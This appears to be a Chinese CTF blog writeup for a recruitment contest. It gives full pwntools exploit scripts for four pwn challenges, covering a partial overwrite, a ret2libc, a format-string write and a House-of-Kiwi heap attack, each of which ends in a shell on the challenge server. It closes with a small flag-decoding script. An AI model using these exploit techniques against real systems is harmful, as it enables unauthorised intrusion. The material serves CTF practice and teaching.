<!doctype html>
<head>
  <meta charset="utf-8">
  <meta name="description" content="&lt;p&gt;一共7个pwn题做了四个，剩下三个没有libc没啥欲望&lt;/p&gt;
&lt;h2 id=&#34;ez-aarch&#34;&gt;&lt;a href=&#34;#ez-aarch&#34; class=&#34;headerlink&#34; title=&#34;ez_aarch&#34;&gt;&lt;/a&gt;ez_aarch&lt;/h2&gt;&lt;p&gt;覆盖低位&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutt">
  <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, user-scalable=yes">
  <title>Dest招新wp | powercat</title>

  <link rel="stylesheet" id="chosen-theme" href="https://rawgit.com/fiatjaf/classless/master/themes/plain/theme.css">
  <script>
let link = document.getElementById('chosen-theme')
let widget = document.createElement('div')
widget.style.position = 'absolute'
widget.style.right = '5px'
widget.style.top = '2px'
widget.style.background = 'beige'
widget.style.color = '#444'
widget.style.zIndex = 99
widget.style.padding = '4px 8px'
widget.innerHTML = `
<label>
  <p>No theme was set on <code>theme_config</code>.<br>
     Choose a theme from the list to experiment with it:</p>
  <select></select>
</label>
`
fetch('https://api.github.com/repos/fiatjaf/classless/contents/themes')
  .then(r => r.json())
  .then(files => {
    document.body.appendChild(widget)
    let select = document.querySelector('select')
    files
      .filter(f => f.type === 'dir')
      .forEach(f => {
        let option = document.createElement('option')
        option.value = f.name
        option.innerHTML = f.name
        select.appendChild(option)
      })
    let options = Array.from(select.querySelectorAll('option'))
    let chosen = options[parseInt(Math.random() * options.length)]
    chosen.selected = true
    link.href = link.href.replace(/themes\/[^\/]+/, `themes/${chosen.value}`)
    select.addEventListener('change', e => {
      let chosen = e.target.value
      link.href = link.href.replace(/themes\/[^\/]+/, `themes/${chosen}`)
    })
  })
  .catch(console.log)
  </script>

<meta name="generator" content="Hexo 6.2.0"></head>

<body>
  <header role="banner">
      <a href="/">
        
          <img src="https://picsum.photos/640/480">
        
      </a>  
    <h1>
      <a href="/">powercat</a>
    </h1>
    <aside>
      <p></p>
    </aside>
  </header>
  
  <main>
    <article>
  <header>
  
  <h1><a href="http://example.com/2022/05/27/guosai/">Dest招新wp</a></h1>
  <aside>
    
    <time datetime="222022-05-27">
      May 27th 2022
    </time>
    
    <ul>
    
      <li><a href="/tags/writeup/">writeup</a></li>
    
    </ul>
  </aside>
</header>

  <div><p>一共7个pwn题做了四个，剩下三个没有libc没啥欲望</p>
<h2 id="ez-aarch"><a href="#ez-aarch" class="headerlink" title="ez_aarch"></a>ez_aarch</h2><p>覆盖低位</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#encoding = utf-8</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import * </span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.os = &#x27;linux&#x27;</span><br><span class="line">context.arch = &#x27;aarch64&#x27;</span><br><span class="line"></span><br><span class="line">s       = lambda data               :p.send(str(data))</span><br><span class="line">sa      = lambda delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = lambda data               :p.sendline(str(data))</span><br><span class="line">sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = lambda num=4096           :p.recv(num)</span><br><span class="line">ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = lambda                    :p.interactive()</span><br><span class="line">uu32    = lambda data               :u32(data.ljust(4,&#x27;\x00&#x27;))</span><br><span class="line">uu64    = lambda data               :u64(data.ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">leak    = lambda name,addr          :log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line"></span><br><span class="line">p = process([&quot;qemu-aarch64&quot;, &quot;-L&quot;, &quot;/usr/aarch64-linux-gnu/&quot;, &quot;./stack&quot;])</span><br><span class="line">#p = remote(&#x27;node4.buuoj.cn&#x27;,29270)</span><br><span class="line">elf = ELF(&#x27;./stack&#x27;)</span><br><span class="line">#libc = ELF(&#x27;libc.so&#x27;)</span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    pl = b&#x27;a&#x27;*0x28 + p8(0x3c)</span><br><span class="line">    p.sendafter(&quot;Please leave your name:\n&quot;,pl)</span><br><span class="line">    itr()</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">i = 0</span><br><span class="line">while 1:</span><br><span class="line">	i += 1</span><br><span class="line">	log.warn(str(i))</span><br><span class="line">	try:  </span><br><span class="line">		pwn()</span><br><span class="line">	except Exception:</span><br><span class="line">		p.close()</span><br><span class="line">		p = process([&quot;qemu-aarch64&quot;, &quot;-L&quot;, &quot;/usr/aarch64-linux-gnu/&quot;, &quot;./stack&quot;])</span><br><span class="line">	</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>

<h2 id="ez-pwn"><a href="#ez-pwn" class="headerlink" title="ez_pwn"></a>ez_pwn</h2><p>就就就0x4，0x4的写呗</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import * </span><br><span class="line">#p = process(&quot;./ez_pwn&quot;)</span><br><span class="line">context(arch=&quot;i386&quot;,os=&quot;linux&quot;)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;,25233)</span><br><span class="line">elf = ELF(&quot;./ez_pwn&quot;)</span><br><span class="line">#libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">s       = lambda data               :p.send(str(data))</span><br><span class="line">sa      = lambda delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = lambda data               :p.sendline(str(data))</span><br><span class="line">sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = lambda num                :p.recv(num)</span><br><span class="line">ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = lambda                    :p.interactive()</span><br><span class="line">uu32    = lambda data               :u32(data.ljust(4,&#x27;\x00&#x27;))</span><br><span class="line">uu64    = lambda data               :u64(data.ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">leak    = lambda name,addr          :log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line"></span><br><span class="line">def num(idx):</span><br><span class="line">	sla(&quot;input your choice:\n&quot;,&#x27;1&#x27;)</span><br><span class="line">	sla(&quot;input num\n&quot;,idx)</span><br><span class="line">	</span><br><span class="line">def num1(idx):</span><br><span class="line">	sla(&quot;input your choice:\n&quot;,&#x27;1&#x27;)</span><br><span class="line">	p.send(idx)</span><br><span class="line"></span><br><span class="line">hackme = 134517270</span><br><span class="line">sla(&quot;input the length of array:\n&quot;,&#x27;-1&#x27;)</span><br><span class="line">num(1212)</span><br><span class="line">num(1212)</span><br><span class="line">num(1212)</span><br><span class="line">num(1212)</span><br><span class="line">num(1212)</span><br><span class="line">num(1212)</span><br><span class="line">num(1212)</span><br><span class="line">num(1212)</span><br><span class="line">num(1212)</span><br><span class="line">num(1212)</span><br><span class="line">num(99999999)</span><br><span class="line">num(1)</span><br><span class="line">num(17)</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">num(puts_plt)</span><br><span class="line">num(hackme)</span><br><span class="line">num(puts_got)</span><br><span class="line"></span><br><span class="line">sla(&quot;input your choice:\n&quot;,&#x27;4&#x27;)</span><br><span class="line"></span><br><span class="line">put_addr = ru(&#x27;\xf7&#x27;)[-3:]</span><br><span class="line">put_addr = u32(put_addr + b&#x27;\xf7&#x27;)</span><br><span class="line">print(hex(put_addr))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">libcbase = put_addr - 0x67560</span><br><span class="line">system = libcbase + 0x3cf10</span><br><span class="line">binsh = libcbase + 0x17b9db</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">libcbase = put_addr - 0x6f560</span><br><span class="line">system = libcbase + 0x445f0</span><br><span class="line">binsh = libcbase + 0x188406</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">ret = 0x0804900e</span><br><span class="line">print(hex(libcbase))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">sla(&quot;input the length of array:\n&quot;,&#x27;-1&#x27;)</span><br><span class="line">num(823)</span><br><span class="line">num(823)</span><br><span class="line">num(823)</span><br><span class="line">num(823)</span><br><span class="line">num(823)</span><br><span class="line">num(823)</span><br><span class="line">num(823)</span><br><span class="line">num(823)</span><br><span class="line">num(823)</span><br><span class="line">num(823)</span><br><span class="line">num(99999999)</span><br><span class="line">num(1)</span><br><span class="line">num(17)</span><br><span class="line">num(ret)</span><br><span class="line">system1 = -(system^0xffffffff) -1</span><br><span class="line">binsh1 = -(binsh^0xffffffff)-1</span><br><span class="line">num(system1)</span><br><span class="line">num(1)</span><br><span class="line">num(binsh1)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">print(ret)</span><br><span class="line">print(hex(system))</span><br><span class="line">print(hex(binsh))</span><br><span class="line"></span><br><span class="line">sla(&quot;input your choice:\n&quot;,&#x27;4&#x27;)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="dest-love"><a href="#dest-love" class="headerlink" title="dest_love"></a>dest_love</h2><p>非栈上格式化字符串漏洞，suo</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">#p = process(&quot;./pwn&quot;)</span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;,26533)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line">s       = lambda data               :p.send(str(data))</span><br><span class="line">sa      = lambda delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = lambda data               :p.sendline(str(data))</span><br><span class="line">sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = lambda num=4096           :p.recv(num)</span><br><span class="line">ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = lambda                    :p.interactive()</span><br><span class="line">uu32    = lambda data               :u32(data.ljust(4,&#x27;\x00&#x27;))</span><br><span class="line">uu64    = lambda data               :u64(data.ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">leak    = lambda name,addr          :log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line"></span><br><span class="line">sla(&quot;What about your love to Dest0g3?\n&quot;,&#x27;%1$p%10$p&#x27;)</span><br><span class="line"></span><br><span class="line">ru(&quot;0x&quot;)</span><br><span class="line">pie = int(r(12),16)-0x4060</span><br><span class="line">print(hex(pie))</span><br><span class="line">shell = pie+0x4010</span><br><span class="line">stack_addr = int(r(14),16)+ 0x28-0x100</span><br><span class="line">ret_addr = stack_addr </span><br><span class="line">print(hex(stack_addr))</span><br><span class="line">print(hex(shell))</span><br><span class="line">key1 = 0x0ed8</span><br><span class="line">key2 = 0x14</span><br><span class="line"></span><br><span class="line">sla(&quot;What about your love to Dest0g3?\n&quot;,&#x27;%&#x27;+str(stack_addr&amp;0xffff)+&#x27;c&#x27;+&#x27;%10$hn&#x27;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">sla(&quot;What about your love to Dest0g3?\n&quot;,&#x27;%&#x27;+str(shell&amp;0xffff)+&#x27;c&#x27;+&#x27;%39$hn&#x27;)</span><br><span class="line">sla(&quot;What about your love to Dest0g3?\n&quot;,&#x27;%&#x27;+str(key1)+&#x27;c&#x27;+&#x27;%12$hn&#x27;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">sla(&quot;What about your love to Dest0g3?\n&quot;,&#x27;%&#x27;+str((shell&amp;0xffff)+2)+&#x27;c&#x27;+&#x27;%39$hn&#x27;)</span><br><span class="line">sla(&quot;What about your love to Dest0g3?\n&quot;,&#x27;%&#x27;+str(key2)+&#x27;c&#x27;+&#x27;%12$hn&#x27;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="ez-kiwi"><a href="#ez-kiwi" class="headerlink" title="ez_kiwi"></a>ez_kiwi</h2><p>没啥说的就是kiwi</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line">#encoding = utf-8</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import * </span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.os = &#x27;linux&#x27;</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line"></span><br><span class="line">s       = lambda data               :p.send(str(data))</span><br><span class="line">sa      = lambda delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = lambda data               :p.sendline(str(data))</span><br><span class="line">sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = lambda num=4096           :p.recv(num)</span><br><span class="line">ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = lambda                    :p.interactive()</span><br><span class="line">uu32    = lambda data               :u32(data.ljust(4,&#x27;\x00&#x27;))</span><br><span class="line">uu64    = lambda data               :u64(data.ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">leak    = lambda name,addr          :log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line"></span><br><span class="line">#p = process([b&quot;./ld-2.31.so&quot;, b&quot;./ez_kiwi&quot;], env=&#123;&quot;LD_PRELOAD&quot;:b&quot;./libc.so.6&quot;&#125;)</span><br><span class="line">#p = process(&#x27;./ez_kiwi&#x27;)</span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;,27934)</span><br><span class="line">elf = ELF(&quot;./ez_kiwi&quot;)</span><br><span class="line">libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">def choice(cho):</span><br><span class="line">	sla(&#x27;&gt;&gt; &#x27;,(cho))</span><br><span class="line"></span><br><span class="line">def add(idx,size,content):</span><br><span class="line">	choice(1)</span><br><span class="line">	sla(&#x27;How much do you want?\n&#x27;,size)</span><br><span class="line">	sla(&#x27;Which one do you want to put?\n&#x27;,idx)</span><br><span class="line">	p.sendlineafter(&#x27;Tell me your idea:\n&#x27;,content)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">	choice(2)</span><br><span class="line">	sla(&#x27;Which one do you want to remove?\n&#x27;,idx)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">	choice(3)</span><br><span class="line">	sla(&#x27;Which one do you want to look?&#x27;,idx)</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">	choice(4)</span><br><span class="line">	sla(&#x27;Which one do you want to change?&#x27;,idx)</span><br><span class="line">	p.sendlineafter(&#x27;Change your idea:\n&#x27;,content) </span><br><span class="line">def chunk():</span><br><span class="line">	choice(666)</span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">	sla(&quot;Before the game starts, please give me your name:\n&quot;,&#x27;bpc&#x27;)</span><br><span class="line">	add(0,0xf8,&#x27;&#x27;)</span><br><span class="line">	add(1,0xf8,&#x27;&#x27;)</span><br><span class="line">	delete(1)</span><br><span class="line">	delete(0)</span><br><span class="line">	add(0,0xf8,&#x27;&#x27;)</span><br><span class="line">	#gdb.attach(p)</span><br><span class="line">	show(0)</span><br><span class="line">	ru(&#x27;\x20&#x27;)</span><br><span class="line">	heap_base = u64((ru(&#x27;\x20&#x27;)[-6:]).ljust(8,b&#x27;\x00&#x27;))-0x30a</span><br><span class="line">	delete(0)</span><br><span class="line">	for i in range(7):</span><br><span class="line">		add(i,0xf8,str(i))</span><br><span class="line">	add(7,0xf8,&#x27;7&#x27;)</span><br><span class="line">	add(8,0xf8,&#x27;8&#x27;)</span><br><span class="line">	add(9,0xf8,&#x27;9&#x27;)</span><br><span class="line">	for i in range(7):</span><br><span class="line">		delete(i)</span><br><span class="line">	delete(8)</span><br><span class="line">	delete(7)</span><br><span class="line">	add(7,0x10,&#x27;&#x27;)</span><br><span class="line">	show(7)</span><br><span class="line">	libcbase = u64((ru(&#x27;\x7f&#x27;)[-5:]+b&#x27;\x7f&#x27;).ljust(8,b&#x27;\x00&#x27;))-0x1ebd0a</span><br><span class="line">	system = libcbase + libc.sym[&#x27;system&#x27;]</span><br><span class="line">	stderr = libcbase + libc.sym[&#x27;_IO_2_1_stderr_&#x27;]</span><br><span class="line">	jumps = libcbase + 0x1ed4a0+0x60</span><br><span class="line">	top_chunk = heap_base+0xdc8</span><br><span class="line">	print(&#x27;libc_base=&#x27;+hex(libcbase))</span><br><span class="line">	print(&#x27;topchunk=&#x27;+hex(top_chunk))</span><br><span class="line">	delete(7)</span><br><span class="line">	add(7,0xf8,&#x27;7&#x27;)</span><br><span class="line">	add(8,0xf8,&#x27;8&#x27;)</span><br><span class="line">	for i in range(7):</span><br><span class="line">		add(i,0xf8,str(i))</span><br><span class="line">	for i in range(7):</span><br><span class="line">		delete(i)</span><br><span class="line">	pl = p64(0)+p64(0xf1)</span><br><span class="line">	pl += p64(heap_base+0x7d0)+p64(heap_base+0x7d0)</span><br><span class="line">	pl = pl.ljust(0xf0,b&#x27;\x00&#x27;)</span><br><span class="line">	pl += p64(0xf0)</span><br><span class="line">	edit(8,pl)</span><br><span class="line">	delete(7)</span><br><span class="line">	for i in range(8):</span><br><span class="line">		add(i,0xf8,str(i))</span><br><span class="line">	delete(6)</span><br><span class="line">	delete(7)</span><br><span class="line">	pl = p64(0)+p64(0x100)+p64(jumps)</span><br><span class="line">	edit(8,pl)</span><br><span class="line">	add(6,0xf8,&#x27;a&#x27;)</span><br><span class="line">	add(7,0xf8,p64(system))</span><br><span class="line">	delete(5)</span><br><span class="line">	delete(6)</span><br><span class="line">	pl = p64(0)+p64(0x100)+p64(stderr)</span><br><span class="line">	edit(8,pl)</span><br><span class="line">	add(5,0xf8,&#x27;a&#x27;)</span><br><span class="line">	add(6,0xf8,&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">	delete(4)</span><br><span class="line">	delete(5)</span><br><span class="line">	pl = p64(0)+p64(0x100)+p64(top_chunk)</span><br><span class="line">	edit(8,pl)</span><br><span class="line">	add(4,0xf8,&#x27;a&#x27;)</span><br><span class="line">	add(5,0xf8,p8(0))</span><br><span class="line">	#gdb.attach(p)</span><br><span class="line">	chunk()</span><br><span class="line">	itr()</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">i = 0</span><br><span class="line">while 1:</span><br><span class="line">	i += 1</span><br><span class="line">	log.warn(str(i))</span><br><span class="line">	try:  </span><br><span class="line">		pwn()</span><br><span class="line">	except Exception:</span><br><span class="line">		p.close()</span><br><span class="line">		if(local == 1):</span><br><span class="line">			p = process(binary)</span><br><span class="line">		else:</span><br><span class="line">			p = remote(ip,port)</span><br><span class="line">		continue</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure>

<h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v4 = [ 0xB3, 0x91, 0x82, 0x80, 0xC3, 0x9B, 0xCE, 0x75, 0xCF, 0x9C,0x9A, 0x85,0x85, 0xCD, 0xB8, 0x84, 0xAA, 0x7D, 0xBD, 0xBB,0xB1, 0xB5, 0x96, 0x71, 0x8D, 0x9E, 0x86, 0xBF, 0x73, 0xA8,0xA3, 0x9C, 0x83, 0x65, 0x9E, 0x57]</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(len(v4)):</span><br><span class="line">    flag+=chr((v4[i]^0xf7)-i)</span><br><span class="line">print(len(v4))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

</div>
</article>

  </main>
  <aside>
    <p>This is an `aside`, a useful place to put information of any kind: metadata about the site author (with or without pictures), brief information about the purposes of the site, a static collection of external links or anything else.</p>
<p>For some Classless themes pictures and data about the author may suit better in the `cover` and `description` site attributes (see `config.toml`), but most of the times that kind of information will fit here better.</p>

  </aside>
  <footer role="contentinfo">
    <p>A default site footer. If you don't know what to place here maybe you should just write your name plus the current year?</p>
<p>If you want to have a sitemap, a contact form or other complex stuff, most Classless themes will also handle it nicely. Or you can take a look at the <code>aside.html</code> partial.</p>

  </footer>
</body>
